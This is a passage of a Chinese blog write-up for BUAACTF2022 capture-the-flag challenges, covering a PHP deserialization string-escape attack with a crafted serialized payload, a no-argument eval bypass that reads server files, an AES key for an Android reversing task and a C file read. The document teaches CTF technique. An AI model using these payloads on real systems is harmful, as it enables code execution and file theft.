<p>审计源码发现在Admin类中存在魔术方法__toString可以执行shell指令，因此我们尝试利用反序列化漏洞传入一个Admin类型的对象以执行该指令。</p>
<p>观察序列代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$name</span>)&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$age</span>)&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$height</span>)&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$weight</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$r</span>=<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">information</span>(<span class="variable">$age</span>,<span class="variable">$height</span>,<span class="variable">$weight</span>));</span><br><span class="line">        <span class="variable">$t</span>=<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">Guest</span>(<span class="variable">$name</span>,<span class="keyword">new</span> <span class="title function_ invoke__">information</span>(<span class="variable">$age</span>,<span class="variable">$height</span>,<span class="variable">$weight</span>)));</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>发现并没有给Admin类型设置序列化接口，因此我们在反序列化时需要传入一个Guest类型，在Guest类型中包含含有Admin类型的信息。</p>
<p>继续观察代码发现：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ban</span>=<span class="string">&#x27;/flag/i&#x27;</span>;</span><br><span class="line"><span class="variable">$t</span>=<span class="title function_ invoke__">preg_replace</span>(<span class="variable">$ban</span>, <span class="string">&#x27;xdl&#x27;</span>, <span class="variable">$t</span>);</span><br></pre></td></tr></table></figure>
<p>这个地方设置了一个替换，将所有传入的flag转成xdl，相当于减少了一个字符。因此猜想可以利用这一漏洞“吃掉”payload中的某些字符，使得我们输入的是Guest类型，但传入的是Admin类型。</p>
<p>最后构造的payload如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">O:5:&quot;Guest&quot;:2:&#123;s:4:&quot;name&quot;;s:3:&quot;defflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflag&quot;;s:11:&quot;information&quot;;O:11:&quot;information&quot;:3:&#123;s:3:&quot;age&quot;;s:2:&quot;gh&quot;;s:6:&quot;height&quot;;s:2:&quot;ij&quot;;s:6:&quot;weight&quot;;s:66:&quot;;O:5:&quot;Admin&quot;:1:&#123;s:5:&quot;admin&quot;;O:5:&quot;Admin&quot;:1:&#123;s:5:&quot;admin&quot;;s:3:&quot;abc&quot;;&#125;&#125;&quot;;&#125;&#125;</span><br><span class="line"></span><br><span class="line">//这个payload是最开始的，不太对。通过的payload我忘存了，大概长这样</span><br></pre></td></tr></table></figure>
<p>利用设定的赋值长度和flag的过滤转化，我们可以吃掉中间的字符，使得”def”前和”;s:11”前的引号构成闭合，从而传入Admin类型，触发shell控制。</p>
<p>拿到shell后观察代码发现shell指令中过滤了current指令和php伪协议，同时限制输入括号中的内容。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/data:\/\/|filter:\/\/|php:\/\//i&#x27;</span>,<span class="variable">$shellcode</span>))</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">&quot;hacker!&quot;</span>);</span><br><span class="line">                <span class="keyword">if</span>(<span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[a-z,_]+\((?R)?\)/&#x27;</span>, <span class="literal">NULL</span>, <span class="variable">$shellcode</span>)!==<span class="string">&#x27;;&#x27;</span>)</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">&quot;no!no!no!&quot;</span>);</span><br><span class="line">                <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/current|show_source/i&#x27;</span>,<span class="variable">$shellcode</span>))</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">&quot;clever hacker!&quot;</span>);</span><br><span class="line">                <span class="keyword">eval</span>(<span class="variable">$shellcode</span>);</span><br></pre></td></tr></table></figure>
<p>因此我们传入无参rce指令：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">highlight_file(array_rand(array_flip(scandir(getcwd()))))</span><br></pre></td></tr></table></figure>
<p>getcwd获得当前位置，scandir获得地址下文件目录。利用array_flip翻转元素键值，此时再用array_rand随机匹配即可扫描到文件内容。最后用highlight_file显示文件内容。用burpsuite发POST包直至随机匹配到flag文件即可得到flag。</p>
<h2 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h2><h3 id="oneQuiz"><a href="#oneQuiz" class="headerlink" title="oneQuiz"></a>oneQuiz</h3><p>题中给出了一个apk文件，说明是安卓逆向。使用安卓逆向平台jadx打开文件即可查看源代码。在com-example.activitytest-FirstActivity路径下找到核心代码，发现被加密的flag。</p>
<p><img src="C:\Users\T14S\AppData\Roaming\Typora\typora-user-images\image-20220328125550599.png" alt="image-20220328125550599" style="zoom: 50%;" /></p>
<p>加密模式为AES-ECB-PKCS5Padding，使用的密钥为f1rstQu1z-Sec0nd，解密即可得到flag。</p>
<h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="Or4ngeOj"><a href="#Or4ngeOj" class="headerlink" title="Or4ngeOj"></a>Or4ngeOj</h3><p>打开题目环境发现只有一个可以填写c语言代码的平台，测试helloworld样例发现可以编译并输出结果，猜测该oj是一个c语言编译器。题目中提示flag藏在./flag路径下，于是利用c语言文件IO操作，fgetc函数读取文件内容并输出，得到flag。</p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="http://example.com">ch3v4l</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="http://example.com/2023/04/19/BUAACTF2022%E9%A2%98%E8%A7%A3/">http://example.com/2023/04/19/BUAACTF2022%E9%A2%98%E8%A7%A3/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="https://s2.loli.net/2023/04/19/KA3Cm4z7hWDncyk.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2022/09/05/%E5%AE%89%E5%85%A8%E5%8D%8F%E8%AE%AE%E7%AC%94%E8%AE%B0/"><img class="next-cover" src="https://s2.loli.net/2022/09/05/cIZmqMlYpKBAgsT.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">安全协议笔记</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://s2.loli.net/2023/04/19/cP5FvzqJkZ9SLAR.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">ch3v4l</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">3</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">2</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/c4Tch3r" target="_blank" title="Github"><i class="fab fa-github"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Catalog</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#BUAACTF2022-Writeup-by-ch3v4l"><span class="toc-number">1.</span> <span class="toc-text">BUAACTF2022 Writeup by ch3v4l</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#MISC"><span class="toc-number">1.1.</span> <span class="toc-text">MISC</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#welcome"><span class="toc-number">1.1.1.</span> <span class="toc-text">welcome</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#easy-game"><span class="toc-number">1.1.2.</span> <span class="toc-text">easy_game</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#math-is-safe"><span class="toc-number">1.1.3.</span> <span class="toc-text">math is safe</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Who-is-he"><span class="toc-number">1.1.4.</span> <span class="toc-text">Who is he</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sqlmisc2"><span class="toc-number">1.1.5.</span> <span class="toc-text">sqlmisc2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Hello-visitor"><span class="toc-number">1.1.6.</span> <span class="toc-text">Hello,visitor!</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Wordle-Revenge"><span class="toc-number">1.1.7.</span> <span class="toc-text">Wordle Revenge</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Crypto"><span class="toc-number">1.2.</span> <span class="toc-text">Crypto</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#pow"><span class="toc-number">1.2.1.</span> <span class="toc-text">pow</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ez-game"><span class="toc-number">1.2.2.</span> <span class="toc-text">ez_game</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#chaos-generator"><span class="toc-number">1.2.3.</span> <span class="toc-text">chaos_generator</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#easyrsa"><span class="toc-number">1.2.4.</span> <span class="toc-text">easyrsa</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ez-des"><span class="toc-number">1.2.5.</span> <span class="toc-text">ez_des</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#fyh%E2%80%99s-gift"><span class="toc-number">1.2.6.</span> <span class="toc-text">fyh’s gift</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Block"><span class="toc-number">1.2.7.</span> <span class="toc-text">Block?</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Web"><span class="toc-number">1.3.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%AC%E5%94%A4%E7%A5%9E%E9%BE%99"><span class="toc-number">1.3.1.</span> <span class="toc-text">召唤神龙</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#login"><span class="toc-number">1.3.2.</span> <span class="toc-text">login</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#common-php"><span class="toc-number">1.3.3.</span> <span class="toc-text">common_php</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Re"><span class="toc-number">1.4.</span> <span class="toc-text">Re</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#oneQuiz"><span class="toc-number">1.4.1.</span> <span class="toc-text">oneQuiz</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pwn"><span class="toc-number">1.5.</span> <span class="toc-text">Pwn</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Or4ngeOj"><span class="toc-number">1.5.1.</span> <span class="toc-text">Or4ngeOj</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2023/04/19/BUAACTF2022%E9%A2%98%E8%A7%A3/" title="BUAACTF2022题解"><img src="https://s2.loli.net/2023/04/19/KA3Cm4z7hWDncyk.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="BUAACTF2022题解"/></a><div class="content"><a class="title" href="/2023/04/19/BUAACTF2022%E9%A2%98%E8%A7%A3/" title="BUAACTF2022题解">BUAACTF2022题解</a><time datetime="2023-04-19T15:24:56.000Z" title="Created 2023-04-19 23:24:56">2023-04-19</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/09/05/%E5%AE%89%E5%85%A8%E5%8D%8F%E8%AE%AE%E7%AC%94%E8%AE%B0/" title="安全协议笔记"><img src="https://s2.loli.net/2022/09/05/cIZmqMlYpKBAgsT.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="安全协议笔记"/></a><div class="content"><a class="title" href="/2022/09/05/%E5%AE%89%E5%85%A8%E5%8D%8F%E8%AE%AE%E7%AC%94%E8%AE%B0/" title="安全协议笔记">安全协议笔记</a><time datetime="2022-09-05T08:08:18.000Z" title="Created 2022-09-05 16:08:18">2022-09-05</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/09/04/%E7%BE%8A%E5%9F%8E%E6%9D%AF2022-%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/" title="羊城杯2022 部分题解"><img src="https://s2.loli.net/2022/09/04/lNn51fOSicy9sRT.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="羊城杯2022 部分题解"/></a><div class="content"><a class="title" href="/2022/09/04/%E7%BE%8A%E5%9F%8E%E6%9D%AF2022-%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/" title="羊城杯2022 部分题解">羊城杯2022 部分题解</a><time datetime="2022-09-04T07:05:56.000Z" title="Created 2022-09-04 15:05:56">2022-09-04</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2023 By ch3v4l</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Switch Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between single-column and double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><div class="js-pjax"><script>if (!window.MathJax) {
  window.MathJax = {
    tex: {
      inlineMath: [ ['$','$'], ["\\(","\\)"]],
      tags: 'ams'
    },
    chtml: {
      scale: 1.2
    },
    options: {
      renderActions: {
        findScript: [10, doc => {
          for (const node of document.querySelectorAll('script[type^="math/tex"]')) {
            const display = !!node.type.match(/; *mode=display/)
            const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display)
            const text = document.createTextNode('')
            node.parentNode.replaceChild(text, node)
            math.start = {node: text, delim: '', n: 0}
            math.end = {node: text, delim: '', n: 0}
            doc.math.push(math)
          }
        }, ''],
        insertScript: [200, () => {
          document.querySelectorAll('mjx-container:not\([display]\)').forEach(node => {
            const target = node.parentNode
            if (target.nodeName.toLowerCase() === 'li') {
              target.parentNode.classList.add('has-jax')
            } else {
              target.classList.add('has-jax')
            }
          });
        }, '', false]
      }
    }
  }
  
  const script = document.createElement('script')
  script.src = 'https://cdn.jsdelivr.net/npm/mathjax/es5/tex-mml-chtml.min.js'
  script.id = 'MathJax-script'
  script.async = true
  document.head.appendChild(script)
} else {
  MathJax.startup.document.state(0)
  MathJax.texReset()
  MathJax.typeset()
}</script></div><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/fireworks.min.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>